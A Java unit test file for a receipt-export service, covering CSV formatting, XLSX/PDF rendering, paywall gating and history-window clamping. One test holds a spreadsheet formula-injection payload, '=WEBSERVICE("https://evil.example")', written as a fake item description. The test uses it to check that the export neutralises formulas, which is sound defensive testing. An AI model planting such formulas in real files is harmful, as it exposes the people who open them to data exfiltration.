package com.relyon.economizaai.service;

import com.relyon.economizaai.exception.PaywallException;
import com.relyon.economizaai.model.Household;
import com.relyon.economizaai.model.User;
import com.relyon.economizaai.service.ReceiptExportService.ExportFormat;
import com.relyon.economizaai.service.report.PdfReportRenderer;
import com.relyon.economizaai.service.report.PurchaseReportAssembler;
import com.relyon.economizaai.service.report.PurchaseReportData;
import com.relyon.economizaai.service.report.PurchaseReportData.ItemRow;
import com.relyon.economizaai.service.report.PurchaseReportData.Kpis;
import com.relyon.economizaai.service.report.XlsxReportRenderer;
import com.relyon.economizaai.service.subscription.Feature;
import com.relyon.economizaai.service.subscription.SubscriptionGateService;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.extension.ExtendWith;
import org.mockito.InjectMocks;
import org.mockito.Mock;
import org.mockito.junit.jupiter.MockitoExtension;

import java.math.BigDecimal;
import java.nio.charset.StandardCharsets;
import java.time.LocalDateTime;
import java.time.Month;
import java.util.List;
import java.util.UUID;

import static org.assertj.core.api.Assertions.assertThat;
import static org.junit.jupiter.api.Assertions.assertThrows;
import static org.mockito.ArgumentMatchers.any;
import static org.mockito.ArgumentMatchers.anyString;
import static org.mockito.ArgumentMatchers.eq;
import static org.mockito.Mockito.doThrow;
import static org.mockito.Mockito.lenient;
import static org.mockito.Mockito.never;
import static org.mockito.Mockito.verify;
import static org.mockito.Mockito.when;

@ExtendWith(MockitoExtension.class)
class ReceiptExportServiceTest {

    @Mock private PurchaseReportAssembler reportAssembler;
    @Mock private XlsxReportRenderer xlsxReportRenderer;
    @Mock private PdfReportRenderer pdfReportRenderer;
    @Mock private SubscriptionGateService subscriptionGate;
    @Mock private LocalizedMessageService localizedMessageService;

    @InjectMocks private ReceiptExportService service;

    private User user;

    @BeforeEach
    void setUp() {
        var household = Household.builder().id(UUID.randomUUID()).inviteCode("ABC123").build();
        user = User.builder().id(UUID.randomUUID()).email("alexandre+export@economizaai.app")
                .household(household).build();
        // headers echo their key so assertions are stable regardless of locale
        lenient().when(localizedMessageService.translate(anyString())).thenAnswer(inv -> inv.getArgument(0));
        lenient().when(subscriptionGate.clampFrom(eq(user), any())).thenAnswer(inv -> inv.getArgument(1));
    }

    private PurchaseReportData reportWith(ItemRow... items) {
        return new PurchaseReportData(null, null,
                new Kpis(new BigDecimal("47.00"), 1, items.length, new BigDecimal("47.00")),
                List.of(), List.of(), List.of(), List.of(), List.of(items));
    }

    private ItemRow row(String description, String unitPrice) {
        return new ItemRow(LocalDateTime.of(2026, Month.JULY, 20, 18, 30), "Zaffari; Centro", "93015006005182",
                "43260493015006005182651130003394021410514546", description, new BigDecimal("2.000"), "UN",
                new BigDecimal(unitPrice), new BigDecimal(unitPrice).multiply(BigDecimal.TWO),
                "BEVERAGES", new BigDecimal("47.00"));
    }

    @Test
    void csv_buildsSemicolonSeparatedFileWithBom() {
        when(reportAssembler.assemble(eq(user), any(), any()))
                .thenReturn(reportWith(row("CHOPP BRAHMA 440ml", "14.00")));

        var file = service.exportPurchaseHistory(user, null, null, ExportFormat.CSV);
        var csv = new String(file.content(), StandardCharsets.UTF_8);

        assertThat(file.mediaType()).isEqualTo("text/csv");
        assertThat(csv).startsWith("﻿");
        var lines = csv.substring(1).split("\n");
        assertThat(lines[0]).startsWith("export.header.date;export.header.market;");
        assertThat(lines[1]).isEqualTo("20/07/2026 18:30;\"Zaffari; Centro\";93015006005182;"
                + "43260493015006005182651130003394021410514546;CHOPP BRAHMA 440ml;2,000;UN;14,00;28,00;"
                + "BEVERAGES;47,00");
    }

    @Test
    void csv_neutralizesFormulaInjectionInAttackerInfluencedCells() {
        // Item descriptions come from receipt text a merchant (or a forged
        // receipt) controls — a leading '=' must not survive as a formula.
        when(reportAssembler.assemble(eq(user), any(), any()))
                .thenReturn(reportWith(row("=WEBSERVICE(\"https://evil.example\")", "14.00")));

        var csv = new String(service.exportPurchaseHistory(user, null, null, ExportFormat.CSV).content(),
                StandardCharsets.UTF_8);

        assertThat(csv).doesNotContain(";=WEBSERVICE");
        assertThat(csv).contains("'=WEBSERVICE");
    }

    @Test
    void csv_keepsNegativeAmountsUnquoted() {
        when(reportAssembler.assemble(eq(user), any(), any()))
                .thenReturn(reportWith(row("DESCONTO CUPOM", "-2.50")));

        var csv = new String(service.exportPurchaseHistory(user, null, null, ExportFormat.CSV).content(),
                StandardCharsets.UTF_8);

        // A legitimate negative number stays numeric for Excel (no apostrophe).
        assertThat(csv).contains(";-2,50;");
        assertThat(csv).doesNotContain("'-2,50");
    }

    @Test
    void xlsxAndPdf_delegateToRenderers() {
        var report = reportWith(row("ARROZ", "10.00"));
        when(reportAssembler.assemble(eq(user), any(), any())).thenReturn(report);
        when(xlsxReportRenderer.render(report)).thenReturn(new byte[]{80, 75});
        when(pdfReportRenderer.render(report)).thenReturn("%PDF-".getBytes(StandardCharsets.UTF_8));

        var xlsx = service.exportPurchaseHistory(user, null, null, ExportFormat.XLSX);
        var pdf = service.exportPurchaseHistory(user, null, null, ExportFormat.PDF);

        assertThat(xlsx.fileExtension()).isEqualTo("xlsx");
        assertThat(xlsx.mediaType()).contains("spreadsheetml");
        assertThat(pdf.fileExtension()).isEqualTo("pdf");
        assertThat(pdf.mediaType()).isEqualTo("application/pdf");
    }

    @Test
    void export_requiresCsvExportFeature() {
        doThrow(new PaywallException(Feature.CSV_EXPORT.name()))
                .when(subscriptionGate).require(user, Feature.CSV_EXPORT);

        assertThrows(PaywallException.class,
                () -> service.exportPurchaseHistory(user, null, null, ExportFormat.CSV));
        verify(reportAssembler, never()).assemble(any(), any(), any());
    }

    @Test
    void export_clampsFromToFreeHistoryWindow() {
        var requestedFrom = LocalDateTime.of(2020, Month.JANUARY, 1, 0, 0);
        var clampedFrom = LocalDateTime.of(2026, Month.JUNE, 22, 0, 0);
        when(subscriptionGate.clampFrom(user, requestedFrom)).thenReturn(clampedFrom);
        when(reportAssembler.assemble(user, clampedFrom, null)).thenReturn(reportWith());

        service.exportPurchaseHistory(user, requestedFrom, null, ExportFormat.CSV);

        verify(reportAssembler).assemble(user, clampedFrom, null);
    }
}
